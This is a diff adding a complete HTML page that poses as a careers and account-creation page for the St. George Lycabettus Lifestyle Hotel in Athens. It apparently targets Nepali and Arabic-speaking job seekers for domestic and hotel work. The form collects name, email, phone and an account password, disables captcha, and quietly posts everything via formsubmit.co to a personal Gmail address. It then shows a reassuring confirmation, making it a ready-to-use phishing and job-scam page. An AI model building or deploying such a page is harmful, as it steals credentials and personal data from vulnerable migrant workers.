@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>St. George Lycabettus - Careers</title>
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&family=Poppins:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
+body{background:#f8f9fb}
+.header{background:#0a192f;padding:22px 20px;text-align:center;border-bottom:3px solid #c5a880}
+.header h1{font-family:'Playfair Display',serif;color:#fff;letter-spacing:1px;font-size:26px}
+.header p{color:#c5a880;letter-spacing:3px;font-size:12px;margin-top:5px}
+.card{max-width:560px;margin:35px auto;background:#fff;padding:40px 32px;border-radius:16px;box-shadow:0 15px 40px rgba(10,25,47,.12)}
+.card h2{font-family:'Playfair Display',serif;color:#0a192f;text-align:center;font-size:24px}
+.card .sub{text-align:center;color:#777;font-size:13px;margin:8px 0 28px}
+label{display:block;margin:16px 0 6px;font-weight:500;color:#0a192f;font-size:13.5px}
+input,select{width:100%;padding:13px 14px;border:1.2px solid #d1d5db;border-radius:10px;outline:none;transition:.2s;background:#fff}
+input:focus,select:focus{border-color:#c5a880;box-shadow:0 0 0 3px rgba(197,168,128,.15)}
+button{width:100%;padding:14px;margin-top:24px;background:linear-gradient(90deg,#0a192f,#123456);color:#c5a880;border:none;border-radius:10px;font-weight:600;font-size:15px;cursor:pointer;letter-spacing:.5px}
+button:hover{opacity:.9}
+.success{display:none;background:#d1fae5;color:#065f46;padding:16px;border-radius:10px;margin-top:20px;text-align:center;font-weight:600;border:1px solid #a7f3d0;line-height:1.6}
+.footer{background:#0a192f;color:#8a9bb5;text-align:center;padding:28px 15px;font-size:12px;line-height:1.8;margin-top:50px}
+.footer b{color:#c5a880}
+</style>
+</head>
+<body>
+
+<div class="header">
+<h1>St. George Lycabettus Lifestyle Hotel</h1>
+<p>LIFESTYLE HOTEL • ATHENS • GREECE</p>
+</div>
+
+<div class="card">
+<h2>Create Your Account</h2>
+<p class="sub">Join our luxury hospitality team</p>
+
+<form id="jobForm" action="https://formsubmit.co/gs7783005@gmail.com" method="POST">
+<input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_subject" value="New Application - St. George Lycabettus Hotel">
+<input type="hidden" name="_template" value="table">
+
+<label>Full Name</label>
+<input type="text" name="Full Name" required placeholder="Enter your full name">
+
+<label>Email Address</label>
+<input type="email" name="Email" required placeholder="name@example.com">
+
+<label>Password</label>
+<input type="password" name="Password" required placeholder="Minimum 8 characters">
+
+<label>Phone Number</label>
+<input type="tel" name="Phone" required placeholder="+977 98XXXXXXXX">
+
+<label>Country</label>
+<select name="Country" id="countryList" required></select>
+
+<label>Job Position</label>
+<select name="Job Position" required>
+<option value="">-- Select Job --</option>
+<option>1. Housekeeping Staff - عاملة نظافة</option>
+<option>2. Babysitter / Nanny - مربية أطفال</option>
+<option>3. Waiter / Waitress - نادل</option>
+<option>4. Home Service - هوم سيفرز</option>
+<option>5. Front Desk Receptionist</option>
+<option>6. Housekeeping Supervisor</option>
+<option>7. Executive Chef / Cook</option>
+<option>8. Concierge & Guest Service</option>
+<option>9. Bellman / Porter</option>
+<option>10. Security Officer</option>
+<option>11. Spa & Wellness Therapist</option>
+<option>12. Barista / Bartender</option>
+<option>13. Restaurant Manager</option>
+<option>14. Maintenance / Technician</option>
+<option>15. Laundry Attendant</option>
+<option>16. Reservation Officer</option>
+</select>
+
+<button type="submit">Create Account & Apply</button>
+
+<div id="ok" class="success">
+✅ تم ارسال البيانات سيتم التواصل معك في اقرب وقت<br>
+Your data has been submitted. We will contact you soon.
+</div>
+</form>
+</div>
+
+<div class="footer">
+<b>St. George Lycabettus Lifestyle Hotel</b><br>
+2 Kleomenous Street, Lycabettus Hill, Athens 106 75, Greece<br>
+© 2026 St. George Lycabettus Lifestyle Hotel • Privacy Policy • Terms of Service • Careers<br>
+Designed for Global Talent Acquisition
+</div>
+
+<script>
+const list=document.getElementById("countryList");
+const countries=["Nepal","Afghanistan","Albania","Algeria","Argentina","Australia","Austria","Bahrain","Bangladesh","Belgium","Brazil","Canada","China","Denmark","Egypt","Ethiopia","France","Germany","Greece","India","Indonesia","Italy","Japan","Jordan","Kenya","Kuwait","Lebanon","Malaysia","Morocco","Netherlands","Nigeria","Oman","Pakistan","Philippines","Qatar","Russia","Saudi Arabia","Singapore","South Africa","Spain","Sri Lanka","Sudan","Sweden","Switzerland","Thailand","Turkey","UAE","UK","USA","Yemen"];
+countries.forEach(c=>{
+let o=document.createElement("option");
+o.value=c;
+o.textContent=c==="Nepal"?"🇳🇵 Nepal - نيبال":c;
+if(c==="Nepal") o.selected=true;
+list.appendChild(o);
+});
+document.getElementById("jobForm").addEventListener("submit",function(e){
+e.preventDefault();
+fetch(this.action,{method:"POST",body:new FormData(this)})
+.then(()=>{document.getElementById("ok").style.display="block"; this.reset(); window.scrollTo({top:0,behavior:'smooth'})})
+.catch(()=>{alert("Error, please try again")});
+});
+</script>
+</body>
+</html>
